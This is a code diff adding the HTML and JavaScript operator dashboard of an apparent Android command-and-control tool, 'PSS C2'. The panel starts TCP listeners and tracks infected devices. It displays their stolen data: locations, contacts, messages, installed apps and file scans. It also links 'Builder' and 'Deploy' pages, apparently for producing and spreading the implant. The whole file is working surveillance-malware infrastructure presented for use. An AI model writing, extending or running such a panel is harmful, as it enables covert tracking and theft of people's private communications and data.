@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PSS // Command & Control</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --g1:#00ff88;--g2:#00dd77;--g3:#00bb66;--g4:#009955;--g5:#006633;
+  --bg:#050608;--bg2:#0a0c10;--bg3:#0e1116;--card:#0d1117;--card2:#131920;
+  --border:rgba(0,255,136,.08);--border-h:rgba(0,255,136,.18);
+  --t1:#e8ede9;--t2:#8b9b8e;--t3:#4a5a4e;
+  --danger:#ff3b4f;--warn:#ffb020;
+  --radius:12px;--radius-sm:8px;
+  --mono:'JetBrains Mono',monospace;--sans:'Inter',system-ui,sans-serif;--display:'Orbitron',sans-serif;
+  --shadow:0 8px 32px rgba(0,0,0,.6);
+  --glow:0 0 40px rgba(0,255,136,.06);
+  --glow-strong:0 0 60px rgba(0,255,136,.12);
+}
+html,body{height:100%;background:var(--bg);color:var(--t1);font-family:var(--sans);overflow:hidden;-webkit-font-smoothing:antialiased}
+
+::selection{background:rgba(0,255,136,.2);color:#fff}
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(0,255,136,.15);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:rgba(0,255,136,.25)}
+
+.ambient{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.ambient::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 20% 20%,rgba(0,255,136,.04) 0%,transparent 50%),radial-gradient(ellipse at 80% 80%,rgba(0,255,136,.03) 0%,transparent 50%);animation:ambientShift 30s ease-in-out infinite alternate}
+@keyframes ambientShift{0%{transform:translate(0,0)}100%{transform:translate(-5%,3%)}}
+.scanline{position:fixed;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(0,255,136,.06),transparent);z-index:999;pointer-events:none;animation:scanDown 8s linear infinite;opacity:.5}
+@keyframes scanDown{0%{top:0}100%{top:100vh}}
+
+.shell{position:relative;z-index:1;display:grid;grid-template-rows:56px 1fr;height:100vh}
+
+/* ─── TOP BAR ─── */
+.topbar{
+  display:flex;align-items:center;gap:0;
+  padding:0 20px;
+  background:rgba(5,6,8,.85);
+  backdrop-filter:blur(24px) saturate(1.2);
+  border-bottom:1px solid var(--border);
+  z-index:10;
+}
+.brand{display:flex;align-items:center;gap:14px}
+.brand-mark{
+  position:relative;
+  width:38px;height:38px;border-radius:8px;
+  background:linear-gradient(135deg,#00ff88,#009955);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--display);font-weight:900;font-size:11px;color:#000;letter-spacing:1px;
+  box-shadow:0 0 20px rgba(0,255,136,.35),inset 0 1px 0 rgba(255,255,255,.2);
+}
+.brand-mark::after{content:'';position:absolute;inset:-2px;border-radius:10px;border:1px solid rgba(0,255,136,.3);pointer-events:none}
+.brand-text{display:flex;flex-direction:column;line-height:1;gap:3px}
+.brand-name{font-family:var(--display);font-weight:800;font-size:14px;letter-spacing:2px;color:var(--g1);text-shadow:0 0 20px rgba(0,255,136,.3)}
+.brand-sub{font-size:9px;font-weight:500;letter-spacing:3px;text-transform:uppercase;color:var(--t3)}
+
+.topnav{display:flex;align-items:center;gap:2px;margin-left:40px}
+.topnav-btn{
+  padding:7px 16px;border-radius:6px;cursor:pointer;
+  font-size:12px;font-weight:600;color:var(--t3);letter-spacing:.3px;
+  border:1px solid transparent;background:none;font-family:var(--sans);
+  transition:all .2s ease;position:relative;
+}
+.topnav-btn:hover{color:var(--t2);background:rgba(0,255,136,.03);border-color:rgba(0,255,136,.06)}
+.topnav-btn.active{color:var(--g1);background:rgba(0,255,136,.06);border-color:rgba(0,255,136,.12)}
+.topnav-btn.active::after{
+  content:'';position:absolute;bottom:-8px;left:50%;transform:translateX(-50%);
+  width:16px;height:2px;border-radius:1px;background:var(--g1);
+  box-shadow:0 0 10px var(--g1);
+}
+
+.topbar-spacer{flex:1}
+.topbar-status{display:flex;align-items:center;gap:14px}
+.status-pill{
+  display:flex;align-items:center;gap:7px;
+  padding:5px 12px;border-radius:16px;
+  background:rgba(0,255,136,.04);border:1px solid rgba(0,255,136,.1);
+  font-family:var(--mono);font-size:10px;font-weight:600;color:var(--g1);
+}
+.status-pill .dot{width:6px;height:6px;border-radius:50%;background:var(--g1);box-shadow:0 0 10px var(--g1),0 0 4px var(--g1);animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+.clock{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1px;font-weight:500}
+
+/* ─── BODY ─── */
+.body{overflow-y:auto;padding:20px 24px;display:none}
+.body.active{display:block}
+
+/* ─── HOME ─── */
+.hero{margin-bottom:24px;display:flex;align-items:flex-end;justify-content:space-between}
+.hero-left{}
+.hero-row{display:flex;align-items:center;gap:14px;margin-bottom:4px}
+.hero h1{font-family:var(--display);font-size:26px;font-weight:900;letter-spacing:3px;color:var(--g1);text-shadow:0 0 30px rgba(0,255,136,.2)}
+.hero-badge{
+  display:inline-flex;align-items:center;gap:5px;
+  padding:3px 10px;border-radius:4px;
+  background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.12);
+  font-family:var(--mono);font-size:9px;font-weight:700;color:var(--g1);letter-spacing:1px;
+}
+.hero p{font-size:12px;color:var(--t3);font-weight:400;letter-spacing:.3px}
+.hero-dept{
+  font-family:var(--display);font-size:10px;font-weight:700;letter-spacing:4px;
+  color:var(--t3);text-align:right;
+  border:1px solid var(--border);padding:8px 16px;border-radius:6px;
+  background:rgba(0,255,136,.02);
+}
+.hero-dept span{color:var(--g1);display:block;font-size:20px;letter-spacing:8px;margin-bottom:2px;text-shadow:0 0 20px rgba(0,255,136,.3)}
+
+/* METRIC TILES */
+.metrics{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
+.metric-tile{
+  background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:18px 20px;position:relative;overflow:hidden;
+  transition:all .25s ease;
+}
+.metric-tile:hover{border-color:var(--border-h);box-shadow:var(--glow);transform:translateY(-1px)}
+.metric-tile::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(0,255,136,.3),transparent);
+}
+.metric-tile::after{
+  content:'';position:absolute;bottom:0;right:0;width:80px;height:80px;
+  background:radial-gradient(circle,rgba(0,255,136,.03) 0%,transparent 70%);
+  pointer-events:none;
+}
+.metric-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:2px;color:var(--t3);margin-bottom:10px}
+.metric-value{font-family:var(--mono);font-size:30px;font-weight:700;color:var(--g1);line-height:1;text-shadow:0 0 20px rgba(0,255,136,.15)}
+.metric-detail{font-family:var(--mono);font-size:10px;color:var(--t3);margin-top:8px}
+.metric-detail span{color:var(--g2)}
+
+/* LISTENERS */
+.listeners-row{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+.listener-card{
+  flex:1;min-width:200px;background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  padding:14px 18px;display:flex;align-items:center;gap:14px;transition:all .2s;
+}
+.listener-card:hover{border-color:var(--border-h)}
+.listener-port{font-family:var(--mono);font-size:18px;font-weight:700;color:var(--g1);text-shadow:0 0 10px rgba(0,255,136,.2)}
+.listener-info{flex:1;font-size:11px;color:var(--t3);font-weight:500}
+.listener-status{
+  font-family:var(--mono);font-size:9px;font-weight:700;padding:4px 10px;border-radius:4px;
+  background:rgba(0,255,136,.06);color:var(--g1);border:1px solid rgba(0,255,136,.12);
+  letter-spacing:1px;
+}
+.add-listener-btn{
+  padding:14px 20px;background:var(--card);border:1px dashed rgba(0,255,136,.12);border-radius:var(--radius);
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  color:var(--t3);font-size:12px;font-weight:600;cursor:pointer;
+  transition:all .2s;min-width:160px;font-family:var(--sans);
+}
+.add-listener-btn:hover{border-color:rgba(0,255,136,.3);color:var(--g2);background:rgba(0,255,136,.02)}
+
+/* SYS INFO */
+.sysbar{
+  display:flex;gap:20px;padding:12px 18px;
+  background:var(--card);border:1px solid var(--border);border-radius:var(--radius);
+  font-family:var(--mono);font-size:10px;color:var(--t3);letter-spacing:.5px;
+  margin-bottom:20px;
+}
+.sysbar-item{display:flex;align-items:center;gap:6px}
+.sysbar-item strong{color:var(--g2);font-weight:600}
+
+/* TWO-COL */
+.panels{display:grid;grid-template-columns:1fr 340px;gap:12px;margin-bottom:24px}
+
+/* PANELS */
+.panel{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);display:flex;flex-direction:column;overflow:hidden}
+.panel-head{
+  display:flex;align-items:center;gap:10px;padding:14px 18px;
+  border-bottom:1px solid var(--border);background:rgba(0,255,136,.01);
+}
+.panel-head h3{font-size:12px;font-weight:700;letter-spacing:.5px;color:var(--t2)}
+.panel-head .count{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--g1);background:rgba(0,255,136,.06);padding:2px 8px;border-radius:4px;font-weight:600}
+.feed{flex:1;overflow-y:auto;max-height:360px;padding:2px 0}
+.feed-item{
+  display:flex;align-items:flex-start;gap:10px;
+  padding:8px 18px;border-bottom:1px solid rgba(0,255,136,.03);
+  transition:background .15s;
+}
+.feed-item:hover{background:rgba(0,255,136,.015)}
+.feed-dot{width:6px;height:6px;border-radius:50%;margin-top:5px;flex-shrink:0;background:var(--t3)}
+.feed-dot.ok{background:var(--g1);box-shadow:0 0 8px rgba(0,255,136,.5)}
+.feed-dot.err{background:var(--danger);box-shadow:0 0 8px rgba(255,59,79,.4)}
+.feed-dot.warn{background:var(--warn)}
+.feed-body{flex:1;min-width:0}
+.feed-msg{font-size:11px;color:var(--t2);line-height:1.4}
+.feed-msg strong{color:var(--g2);font-weight:600}
+.feed-time{font-family:var(--mono);font-size:9px;color:var(--t3);margin-top:2px}
+
+/* DEVICES PREVIEW */
+.device-preview{padding:10px 14px;display:flex;flex-direction:column;gap:4px}
+.dp-item{
+  display:flex;align-items:center;gap:10px;
+  padding:10px 12px;border-radius:var(--radius-sm);
+  background:rgba(0,255,136,.02);border:1px solid var(--border);
+  cursor:pointer;transition:all .2s;
+}
+.dp-item:hover{border-color:var(--border-h);background:rgba(0,255,136,.04)}
+.dp-dot{width:7px;height:7px;border-radius:50%;background:var(--g1);box-shadow:0 0 10px rgba(0,255,136,.6);flex-shrink:0}
+.dp-info{flex:1;min-width:0}
+.dp-model{font-size:12px;font-weight:600;color:var(--t1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dp-meta{font-family:var(--mono);font-size:9px;color:var(--t3)}
+.dp-arrow{color:var(--g3);font-size:14px;font-weight:700}
+.dp-empty{text-align:center;padding:40px 16px;color:var(--t3);font-size:12px}
+
+/* MODAL */
+.modal-overlay{display:none;position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.7);backdrop-filter:blur(12px);align-items:center;justify-content:center}
+.modal-overlay.open{display:flex}
+.modal{background:var(--card);border:1px solid var(--border-h);border-radius:var(--radius);padding:24px;width:340px;box-shadow:0 20px 60px rgba(0,0,0,.6),var(--glow-strong)}
+.modal h3{font-family:var(--display);font-size:14px;font-weight:700;margin-bottom:16px;letter-spacing:1px;color:var(--g1)}
+.modal-input{
+  width:100%;padding:10px 14px;border-radius:6px;
+  background:var(--bg);border:1px solid var(--border);
+  color:var(--g1);font-family:var(--mono);font-size:13px;
+  outline:none;transition:border-color .2s;
+}
+.modal-input:focus{border-color:var(--g3);box-shadow:0 0 10px rgba(0,255,136,.1)}
+.modal-actions{display:flex;gap:8px;margin-top:16px;justify-content:flex-end}
+.btn{padding:8px 18px;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;border:none;transition:all .2s;font-family:var(--sans);letter-spacing:.3px}
+.btn-ghost{background:none;color:var(--t3);border:1px solid var(--border)}
+.btn-ghost:hover{color:var(--t1);border-color:var(--border-h)}
+.btn-primary{background:var(--g3);color:#000}
+.btn-primary:hover{background:var(--g2);box-shadow:0 0 20px rgba(0,255,136,.3)}
+
+/* LOGS */
+.log-entry{
+  display:flex;gap:12px;align-items:baseline;padding:5px 14px;
+  font-family:var(--mono);font-size:11px;border-radius:3px;transition:background .1s;
+}
+.log-entry:hover{background:rgba(0,255,136,.02)}
+.log-t{color:var(--t3);min-width:75px;flex-shrink:0;font-size:10px}
+.log-m{color:var(--t2)}
+.log-entry.ok .log-m{color:var(--g1)}
+.log-entry.err .log-m{color:var(--danger)}
+.log-entry.warn .log-m{color:var(--warn)}
+
+@media(max-width:1024px){.metrics{grid-template-columns:1fr 1fr}.panels{grid-template-columns:1fr}}
+@media(max-width:640px){.topnav{display:none}.metrics{grid-template-columns:1fr}.body{padding:14px}.hero h1{font-size:20px}.topbar{padding:0 14px}.listeners-row{flex-direction:column}.hero{flex-direction:column;align-items:flex-start;gap:12px}}
+</style>
+</head>
+<body>
+
+<div class="ambient"></div>
+<div class="scanline"></div>
+
+<div class="shell">
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-mark">PSS</div>
+      <div class="brand-text">
+        <span class="brand-name">PSS C2</span>
+        <span class="brand-sub">Command &amp; Control</span>
+      </div>
+    </div>
+    <nav class="topnav">
+      <button class="topnav-btn active" data-page="home">Dashboard</button>
+      <button class="topnav-btn" data-page="clients">Clients</button>
+      <button class="topnav-btn" data-page="builder">Builder</button>
+      <button class="topnav-btn" data-page="deploy">Deploy</button>
+      <button class="topnav-btn" data-page="logs">Logs</button>
+    </nav>
+    <div class="topbar-spacer"></div>
+    <div class="topbar-status">
+      <div class="status-pill"><span class="dot"></span><span id="online-label">0 ONLINE</span></div>
+      <div class="clock" id="clock"></div>
+    </div>
+  </div>
+
+  <!-- HOME -->
+  <div class="body active" id="page-home">
+    <div class="hero">
+      <div class="hero-left">
+        <div class="hero-row">
+          <h1>DASHBOARD</h1>
+          <div class="hero-badge"><span class="dot" style="width:5px;height:5px;border-radius:50%;background:var(--g1);box-shadow:0 0 8px var(--g1)"></span> ACTIVE</div>
+        </div>
+        <p>Real-time command and control overview</p>
+      </div>
+      <div class="hero-dept"><span>PSS</span>DEPARTMENT</div>
+    </div>
+
+    <div class="metrics">
+      <div class="metric-tile">
+        <div class="metric-label">Devices Online</div>
+        <div class="metric-value" id="m-devices">0</div>
+        <div class="metric-detail">Connected right now</div>
+      </div>
+      <div class="metric-tile">
+        <div class="metric-label">Data Sent</div>
+        <div class="metric-value" id="m-sent">0 B</div>
+        <div class="metric-detail"><span id="m-sent-pkts">0</span> pkts &middot; <span id="m-sent-rate">0 B/s</span></div>
+      </div>
+      <div class="metric-tile">
+        <div class="metric-label">Data Received</div>
+        <div class="metric-value" id="m-recv">0 B</div>
+        <div class="metric-detail"><span id="m-recv-pkts">0</span> pkts &middot; <span id="m-recv-rate">0 B/s</span></div>
+      </div>
+      <div class="metric-tile">
+        <div class="metric-label">Listeners</div>
+        <div class="metric-value" id="m-listeners">0</div>
+        <div class="metric-detail">Active TCP ports</div>
+      </div>
+    </div>
+
+    <div id="listeners-row" class="listeners-row"></div>
+
+    <div class="sysbar">
+      <div class="sysbar-item">CPU <strong id="sys-cpu">--</strong></div>
+      <div class="sysbar-item">RAM <strong id="sys-ram">--</strong></div>
+      <div class="sysbar-item">UPTIME <strong id="sys-uptime">--</strong></div>
+      <div class="sysbar-item" style="margin-left:auto">PSS // C2 FRAMEWORK</div>
+    </div>
+
+    <div class="panels">
+      <div class="panel">
+        <div class="panel-head"><h3>Activity Feed</h3><div class="count" id="feed-count">0</div></div>
+        <div class="feed" id="feed"></div>
+      </div>
+      <div class="panel">
+        <div class="panel-head"><h3>Connected Devices</h3></div>
+        <div class="device-preview" id="device-preview">
+          <div class="dp-empty">No devices connected</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CLIENTS -->
+  <div class="body" id="page-clients">
+    <iframe id="clients-frame" src="about:blank" style="width:100%;height:100%;border:none;border-radius:var(--radius);background:var(--bg)"></iframe>
+  </div>
+
+  <!-- BUILDER -->
+  <div class="body" id="page-builder">
+    <iframe id="builder-frame" src="about:blank" style="width:100%;height:100%;border:none;border-radius:var(--radius);background:var(--bg)"></iframe>
+  </div>
+
+  <!-- DEPLOY -->
+  <div class="body" id="page-deploy">
+    <iframe id="deploy-frame" src="about:blank" style="width:100%;height:100%;border:none;border-radius:var(--radius);background:var(--bg)"></iframe>
+  </div>
+
+  <!-- LOGS -->
+  <div class="body" id="page-logs">
+    <div class="hero" style="margin-bottom:16px">
+      <div class="hero-left"><h1 style="font-size:22px">SYSTEM LOGS</h1><p>Real-time server event stream</p></div>
+    </div>
+    <div class="panel" style="max-height:calc(100vh - 160px)">
+      <div class="panel-head"><h3>Log Stream</h3><button class="btn btn-ghost" onclick="document.getElementById('log-feed').innerHTML=''">Clear</button></div>
+      <div class="feed" id="log-feed" style="max-height:none;flex:1;overflow-y:auto"></div>
+    </div>
+  </div>
+</div>
+
+<!-- PORT MODAL -->
+<div class="modal-overlay" id="port-modal">
+  <div class="modal">
+    <h3>ADD LISTENER</h3>
+    <input class="modal-input" id="port-input" type="number" placeholder="Port (1-65535)" min="1" max="65535">
+    <div class="modal-actions">
+      <button class="btn btn-ghost" onclick="closePortModal()">Cancel</button>
+      <button class="btn btn-primary" onclick="addPort()">Start</button>
+    </div>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket=io();let connectedClients=[],activePorts=[],feedItems=0;
+function fmt(b){if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' KB';return(b/1048576).toFixed(2)+' MB'}
+function escHtml(s){var e=document.createElement('span');e.textContent=s;return e.innerHTML}
+
+!function tick(){var d=new Date();document.getElementById('clock').textContent=[d.getHours(),d.getMinutes(),d.getSeconds()].map(function(v){return String(v).padStart(2,'0')}).join(':');setTimeout(tick,1000)}();
+
+document.querySelectorAll('.topnav-btn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    var page=this.dataset.page;
+    document.querySelectorAll('.topnav-btn').forEach(function(b){b.classList.remove('active')});
+    this.classList.add('active');
+    document.querySelectorAll('.body').forEach(function(b){b.classList.remove('active')});
+    document.getElementById('page-'+page).classList.add('active');
+    if(page==='clients'){var fr=document.getElementById('clients-frame');if(!fr.src.includes('clients'))fr.src='UI/clients.html'}
+    if(page==='builder'){var fr=document.getElementById('builder-frame');if(!fr.src.includes('build'))fr.src='UI/build.html'}
+    if(page==='deploy'){var fr=document.getElementById('deploy-frame');if(!fr.src.includes('deploy'))fr.src='UI/deploy.html'}
+  });
+});
+
+function pushFeed(msg,type){
+  feedItems++;document.getElementById('feed-count').textContent=feedItems;
+  var feed=document.getElementById('feed'),el=document.createElement('div');el.className='feed-item';
+  el.innerHTML='<div class="feed-dot '+(type||'')+'"></div><div class="feed-body"><div class="feed-msg">'+msg+'</div><div class="feed-time">'+new Date().toLocaleTimeString()+'</div></div>';
+  feed.insertBefore(el,feed.firstChild);
+  if(feed.children.length>80)feed.removeChild(feed.lastChild);
+}
+
+function pushLog(entry){
+  var feed=document.getElementById('log-feed'),el=document.createElement('div');
+  el.className='log-entry '+(entry.type||'');
+  el.innerHTML='<span class="log-t">'+entry.time+'</span><span class="log-m">'+escHtml(entry.msg)+'</span>';
+  feed.insertBefore(el,feed.firstChild);
+  if(feed.children.length>200)feed.removeChild(feed.lastChild);
+}
+
+function renderDevices(){
+  document.getElementById('m-devices').textContent=connectedClients.length;
+  document.getElementById('online-label').textContent=connectedClients.length+' ONLINE';
+  var wrap=document.getElementById('device-preview');
+  if(!connectedClients.length){wrap.innerHTML='<div class="dp-empty">No devices connected</div>';return}
+  wrap.innerHTML='';
+  connectedClients.forEach(function(c){
+    var el=document.createElement('div');el.className='dp-item';
+    el.innerHTML='<div class="dp-dot"></div><div class="dp-info"><div class="dp-model">'+escHtml(c.details.model||'Unknown')+'</div><div class="dp-meta">SDK '+(c.details.sdk||'?')+' &middot; '+(c.details.country||'')+'</div></div><div class="dp-arrow">&rsaquo;</div>';
+    el.onclick=function(){document.querySelector('[data-page="clients"]').click()};
+    wrap.appendChild(el);
+  });
+}
+
+function renderListeners(){
+  document.getElementById('m-listeners').textContent=activePorts.length;
+  var row=document.getElementById('listeners-row');row.innerHTML='';
+  activePorts.forEach(function(p){
+    var el=document.createElement('div');el.className='listener-card';
+    el.innerHTML='<div class="listener-port">:'+p+'</div><div class="listener-info">TCP Listener</div><div class="listener-status">ACTIVE</div>';
+    row.appendChild(el);
+  });
+  var add=document.createElement('div');add.className='add-listener-btn';
+  add.innerHTML='<span style="font-size:16px;line-height:1;color:var(--g3)">+</span> Add Listener';
+  add.onclick=openPortModal;row.appendChild(add);
+}
+
+function openPortModal(){document.getElementById('port-modal').classList.add('open');document.getElementById('port-input').focus()}
+function closePortModal(){document.getElementById('port-modal').classList.remove('open');document.getElementById('port-input').value=''}
+function addPort(){var v=parseInt(document.getElementById('port-input').value);if(!v||v<1||v>65535)return;socket.emit('start_listener',v);closePortModal()}
+document.getElementById('port-modal').addEventListener('click',function(e){if(e.target===this)closePortModal()});
+document.getElementById('port-input').addEventListener('keydown',function(e){if(e.key==='Enter')addPort()});
+
+socket.on('initial_clients',function(list){connectedClients=list;renderDevices()});
+socket.on('client_connected',function(c){connectedClients.push(c);renderDevices();pushFeed('Device connected: <strong>'+escHtml(c.details.model||'Unknown')+'</strong>','ok')});
+socket.on('client_disconnected',function(id){var idx=connectedClients.findIndex(function(c){return c.id===id});var name=idx>=0?connectedClients[idx].details.model:'Unknown';if(idx>=0)connectedClients.splice(idx,1);renderDevices();pushFeed('Device disconnected: <strong>'+escHtml(name)+'</strong>','err')});
+socket.on('client_data',function(p){if(!p||!p.data)return;var t=p.data.type,cl=connectedClients.find(function(c){return c.id===p.id}),n=cl?cl.details.model:'Unknown';if(t==='location'||t==='geo_ping')pushFeed('Location from <strong>'+escHtml(n)+'</strong>: '+((p.data.lat||0).toFixed(4))+', '+((p.data.lon||0).toFixed(4)),'ok');else if(t==='contacts_sync')pushFeed('Contacts synced from <strong>'+escHtml(n)+'</strong> ('+(p.data.data?p.data.data.length:0)+')','ok');else if(t==='device_info')pushFeed('Device info from <strong>'+escHtml(n)+'</strong>','ok');else if(t==='apps_list')pushFeed('Apps list from <strong>'+escHtml(n)+'</strong> ('+(p.data.data?p.data.data.length:0)+')','ok');else if(t==='msg_sync')pushFeed('Messages synced from <strong>'+escHtml(n)+'</strong>','ok');else if(t==='fs_scan')pushFeed('File scan from <strong>'+escHtml(n)+'</strong>','ok')});
+socket.on('listeners_update',function(ports){activePorts=ports.map(Number);renderListeners()});
+socket.on('stats_update',function(d){document.getElementById('m-sent').textContent=fmt(d.stats.sent.bytes);document.getElementById('m-sent-pkts').textContent=d.stats.sent.packets;document.getElementById('m-sent-rate').textContent=fmt(d.stats.sent.rate)+'/s';document.getElementById('m-recv').textContent=fmt(d.stats.recv.bytes);document.getElementById('m-recv-pkts').textContent=d.stats.recv.packets;document.getElementById('m-recv-rate').textContent=fmt(d.stats.recv.rate)+'/s';document.getElementById('sys-cpu').textContent=d.sysInfo.cpu;document.getElementById('sys-ram').textContent=d.sysInfo.ram;document.getElementById('sys-uptime').textContent=d.sysInfo.uptime});
+socket.on('sys_log',function(e){pushLog(e)});
+socket.on('listener_error',function(d){pushFeed('Listener error on port '+d.port+': '+escHtml(d.message),'err')});
+renderListeners();
+</script>
+</body>
+</html>
